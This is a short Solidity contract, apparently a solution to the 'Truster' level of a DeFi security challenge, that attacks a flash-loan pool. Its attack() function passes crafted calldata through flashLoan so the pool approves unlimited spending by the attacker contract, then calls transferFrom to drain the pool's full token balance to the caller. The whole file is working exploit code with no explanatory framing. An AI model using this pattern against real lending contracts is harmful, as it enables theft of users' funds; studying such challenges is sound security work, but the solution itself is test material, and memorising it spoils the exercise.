// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.7;

import "../truster/TrusterLenderPool.sol";

contract TrusterAttack {

    TrusterLenderPool victimContract;
    IERC20 token;

    constructor(address _victimContractAddress, address _token)
    {
        victimContract = TrusterLenderPool(_victimContractAddress);
        token = IERC20(_token);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256 - 1);
        victimContract.flashLoan(0, msg.sender, address(token), data);
    token.transferFrom(address(victimContract), msg.sender, token.balanceOf(address(victimContract)));
    }

}